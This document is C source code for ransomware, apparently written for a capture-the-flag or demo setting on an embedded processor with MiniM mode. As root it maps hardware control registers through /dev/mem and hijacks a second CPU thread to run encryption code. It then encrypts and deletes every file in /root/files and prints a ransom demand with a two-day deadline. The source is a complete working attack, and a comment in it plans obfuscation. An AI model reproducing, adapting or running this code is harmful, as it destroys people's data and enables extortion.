#include <dirent.h>
#include <fcntl.h>
#include <malloc.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define COREREGS_MMIO     0x4800000
#define COREREGS_MMIO_SZ  0x40000
#define CTRLREGS_OFF      0x30000

#define META_MAX_THREADS  4
#define THREAD_ORIG       0
#define THREAD_TEMP       1
#define THREAD_REG(thread, offset) (((thread) * 0x1000 + (offset) * 8) / sizeof(uint32_t))
#define GLOBAL_REG(offset)         ((offset) / sizeof(uint32_t))
#define CTRL_REG(offset)           ((CTRLREGS_OFF + (offset)) / sizeof(uint32_t))

#define META_MMCUTBLPHYS_MIN 0x700
#define MMU_COUNT 4
#define CTRL_MMU(thread, index) CTRL_REG(META_MMCUTBLPHYS_MIN | ((thread) << 5) | (((index) & (MMU_COUNT - 1)) << 3))

#define META_UNIT_D0      1
#define META_UNIT_D1      2
#define META_UNIT_PC      5

#define META_TXENABLE     0
#define META_TXSTATUS     2
#define META_TXPRIVEXT    29
#define META_TXUXXRXDT    0xfff0
#define META_TXUXXRXRQ    0xfff8

#define META_D0AR2        3
#define META_D1AR5        1
#define META_D1AR1        3
#define META_PC           0

#define TXENABLE_RUNNING  0x00000001u
#define TXENABLE_OFF      0x00000002u
#define TXENABLE_STOPPED  0x00000006u
#define TXSTATUS_ISTAT    0x00010000u
#define TXSTATUS_PSTAT    0x00020000u
#define TXPRIVEXT_MINIM   0x00000080u

#define TXUXXRXRQ_WRITE   0x00000000u
#define TXUXXRXRQ_READ    0x00010000u
#define TXUXXRXRQ_READY   0x80000000u

#define N_WORDS 1024
#define N_BYTES (N_WORDS << 2)
#define N_INPUT_BYTES (N_BYTES / 4 * 3)
// requires defines above
#include "enc_key.h"

__attribute__((constructor)) static void prestart(void)
{
    // This program is best run as root.
    if (getuid())
        _exit(0);
}

// XXX ensure this links at a low address for MiniM
extern void entrypoint(volatile uint32_t* mapping);

__attribute__((noreturn)) extern void trampoline(volatile uint32_t *mapping);

#define PRINT(string) write(STDOUT_FILENO, "" string "", sizeof(string) - 1)

static const char basis_64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

int Base64encode_len(int len)
{
    return ((len + 2) / 3 * 4) + 1;
}

int Base64encode(char *encoded, const char *string, int len)
{
    int i;
    char *p;

    p = encoded;
    for (i = 0; i < len - 2; i += 3) {
    *p++ = basis_64[(string[i] >> 2) & 0x3F];
    *p++ = basis_64[((string[i] & 0x3) << 4) |
                    ((int) (string[i + 1] & 0xF0) >> 4)];
    *p++ = basis_64[((string[i + 1] & 0xF) << 2) |
                    ((int) (string[i + 2] & 0xC0) >> 6)];
    *p++ = basis_64[string[i + 2] & 0x3F];
    }
    if (i < len) {
    *p++ = basis_64[(string[i] >> 2) & 0x3F];
    if (i == (len - 1)) {
        *p++ = basis_64[((string[i] & 0x3) << 4)];
        *p++ = '=';
    }
    else {
        *p++ = basis_64[((string[i] & 0x3) << 4) |
                        ((int) (string[i + 1] & 0xF0) >> 4)];
        *p++ = basis_64[((string[i + 1] & 0xF) << 2)];
    }
    *p++ = '=';
    }

    // *p++ = '\0';
    return p - encoded;
}

void encrypt(volatile uint32_t *map, uint32_t *t_src, uint32_t *t_dst, const uint32_t *t_key) {
    // This trampoline invocation is also in the MiniM source code to switch back, keep it in sync!
    // Ensure the target thread is stopped.
    map[THREAD_REG(THREAD_TEMP, META_TXENABLE)] = TXENABLE_OFF;

    // Steal the main CPU's MMU for unprivileged operations (if you enable PSTAT above, increase the target MMU index by 2)
    map[CTRL_MMU(THREAD_TEMP, 0)] = map[CTRL_MMU(THREAD_ORIG, 0)];
    map[CTRL_MMU(THREAD_TEMP, 1)] = map[CTRL_MMU(THREAD_ORIG, 1)];

    // PC = &trampoline
    map[GLOBAL_REG(META_TXUXXRXDT)] = (uint32_t) &trampoline;
    map[GLOBAL_REG(META_TXUXXRXRQ)] = META_UNIT_PC | (META_PC << 4) | (THREAD_TEMP << 12) | TXUXXRXRQ_WRITE;

    // D1Ar1 = map
    map[GLOBAL_REG(META_TXUXXRXDT)] = (uint32_t) map;
    map[GLOBAL_REG(META_TXUXXRXRQ)] = META_UNIT_D1 | (META_D1AR1 << 4) | (THREAD_TEMP << 12) | TXUXXRXRQ_WRITE;

    // D1Ar5 = new_txmaski set initially to zero
    map[GLOBAL_REG(META_TXUXXRXDT)] = 0;
    map[GLOBAL_REG(META_TXUXXRXRQ)] = META_UNIT_D1 | (META_D1AR5 << 4) | (THREAD_TEMP << 12) | TXUXXRXRQ_WRITE;

    // Start the target thread by setting TXENABLE
    map[THREAD_REG(THREAD_TEMP, META_TXENABLE)] = TXENABLE_RUNNING;

    {
        // put this in a scope so the registers can be marked as clobbered by the other asm block
        register uint32_t *src asm("A0.2") = t_src;
        register uint32_t *dst asm("A0.3") = t_dst;
        register const uint32_t *key asm("A0.4") = t_key;

        // Suspend ourselves. We'll restart in MiniM mode...
        map[THREAD_REG(THREAD_ORIG, META_TXENABLE)] = TXENABLE_STOPPED;
        __asm__ volatile (
                "B .\n"
                // input registers for encryption code
                :: "r" (src), "r" (dst), "r" (key)
                );


    }
    __asm__ volatile (
        ".incbin \"encrypt.bin\"\n"
        ".incbin \"minim_disable.bin\"\n"
        ".balign 4\n"
        ::: // MiniM code will clobber these registers
        "D0.0", "D0.2", "D0.3", "D0.4", "D0.5", "D0.6", "D0.7",
        "D1.0", "D1.1", "D1.2", "D1.3", "D1.4", "D1.5", "D1.6", "D1.7",
        "A0.2", "A0.3", "A0.4", "A1.2", "A1.3"
    );
}

int main(int argc, char *argv[]) {
    printf(
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘\n"
        "⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀\n"
        "⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸\n"
        "⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇\n"
        "⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃\n"
        "⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀\n"
        "⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀\n"
        "⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀\n"
        "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        "    ___    ____                       _____ __                                            \n"
        "   /   |  / / /  __  ______  _____   / __(_) /__  _____   ____ _________                  \n"
        "  / /| | / / /  / / / / __ \\  ___/  / /_/ / / _ \\  ___/  / __ `/ ___/ _ \\                 \n"
        " / ___ |/ / /  / /_/ / /_/ / /     / __/ / /  __(__  )  / /_/ / /  /  __/                 \n"
        "/_/  |_/_/_/   \\ _, /\\ ___/_/     /_/ /_/_/\\ __/____/   \\ _,_/_/   \\ __/                  \n"
        "              /____/_  _                                                 __           ____\n"
        "   ____ ____  / /_/ /_(_)___  ____ _   ___  ____  ____________  ______  / /____  ____/ / /\n"
        "  / __ `/ _ \\  __/ __/ / __ \\  __ `/  / _ \\  __ \\  ___/ ___/ / / / __ \\  __/ _ \\  __  / / \n"
        " / /_/ /  __/ /_/ /_/ / / / / /_/ /  /  __/ / / / /__/ /  / /_/ / /_/ / /_/  __/ /_/ /_/  \n"
        " \\ _, /\\ __/\\ _/\\ _/_/_/ /_/\\ _, /   \\ __/_/ /_/\\ __/_/   \\ _, / .___/\\ _/\\ __/\\ _,_(_)   \n"
        "/____/                     /____/                        /____/_/                         \n"
        "\n"
        "brrrrr"
    );

    // give the system a chance to print the banner before switching to MiniM mode
    //sched_yield();

    // Conveniently, the control registers are exposed as memory-mapped IO. Just assume that
    // this runs as root.
    // XXX: Obfuscate this
    int fd = openat(AT_FDCWD, "/dev/mem", O_RDWR);
    if (fd < 0)
        return 1;
    volatile uint32_t *map = mmap(NULL, COREREGS_MMIO_SZ, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_LOCKED, fd, COREREGS_MMIO);
    if (map == MAP_FAILED)
        return 1;


    DIR *files;
    struct dirent* file_info;

    if ((files=opendir("/root/files")) == NULL) {
        printf("You don't have any files. Screw you!\r");
        return 1;
    }

    chdir("/root/files");

    uint32_t *src = memalign(0x1000, N_BYTES);
    uint32_t *dst = memalign(0x1000, N_BYTES);
    //printf("Ptrs: %p %p\n", src, dst);


    while ((file_info = readdir(files)) != 0) {
        char *name = file_info->d_name;
        int name_len = strlen(name);
        if ((name_len == 1 && name[0] == '.') ||
                name_len == 2 && name[0] == '.' && name[1] == '.') {
            continue;
        }
        if (strcmp(name + name_len - 4, ".enc") == 0) {
            printf("Your file %s is already encrypted. You fool!\n", name);
            continue;
        }

        int file = open(name, O_RDONLY);
        if (file < 0) {
            printf("Can't encrypt file %s. Oh NO!\n", name);
            continue;
        }

        char *encrypted_name = malloc(name_len + 4);
        if (encrypted_name == NULL) {
            printf("Your system is broken\n");
            close(file);
            return -1;
        }
        sprintf(encrypted_name, "%s.enc", name);
        int encrypted_file = open(encrypted_name, O_RDWR | O_CREAT, 0666);
        free(encrypted_name);
        if (encrypted_file < 0) {
            printf("Can't create encrypt file %s. Oh NO!\n", encrypted_name);
            close(file);
            continue;
        }

        int ret;
        do {
            printf("r");
            fflush(stdout);
            usleep(100);
            ret = read(file, dst, N_INPUT_BYTES);
            if (ret == -1) {
                printf("Can't read file %s. Lucky you.\n", name);
                break;
            } else if (ret == 0) {
                // done
                break;
            }

            memset(src, 0, N_BYTES);
            int enc_len = Base64encode((char*)src, (char*)dst, ret);
            //fwrite(src, 1, enc_len, stdout);
            //putchar('\n');
            encrypt(map, src, dst, enc_key);

            for (int i = 0; i < N_WORDS; i+=4) {
                //printf("[0x%03x] 0x%08x 0x%08x 0x%08x 0x%08x\n", i, dst[i], dst[i+1], dst[i+2], dst[i+3]);
                //printf("[0x%03x] 0x%08x 0x%08x 0x%08x 0x%08x\n", i, src[i], src[i+1], src[i+2], src[i+3]);
            }

            write(encrypted_file, dst, N_BYTES);
        } while (ret == N_INPUT_BYTES);
        close(file);
        close(encrypted_file);
        unlink(name);
    }
    // Using unlink during directory walk leads to unspecified behaviour
    // In this case closedir() is stuck forever, so skip it
    //closedir(files);

    printf("\n\nYou are done now! Send me some money and I will decrypt your files. You have 2 days to answer.\n");
}

// Trampoline is written in assembly because the thread does not have a valid stack.
__asm__ (
    ".include \"trampoline.S\""
);
